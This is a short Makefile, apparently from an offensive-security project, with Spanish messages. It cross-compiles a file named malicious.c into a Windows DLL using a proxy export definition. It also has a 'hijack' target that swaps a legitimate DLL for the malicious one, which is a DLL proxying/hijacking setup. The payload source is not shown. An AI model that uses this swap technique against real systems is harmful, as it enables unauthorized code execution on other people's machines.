all: linux



# =======================================
# LINUX (ok)
# =======================================
linux: bin/malicious.dll

bin/malicious.dll: malicious.c
	@echo "Compilando DLL..."
	@mkdir -p bin
	x86_64-w64-mingw32-gcc -shared -o bin/malicious.dll malicious.c proxy.def -s

hijack:
	mv bin/real.dll bin/og_real.dll
	mv bin/malicious.dll bin/real.dll


clean:
	@echo "Limpiando..."
	@rm -rf bin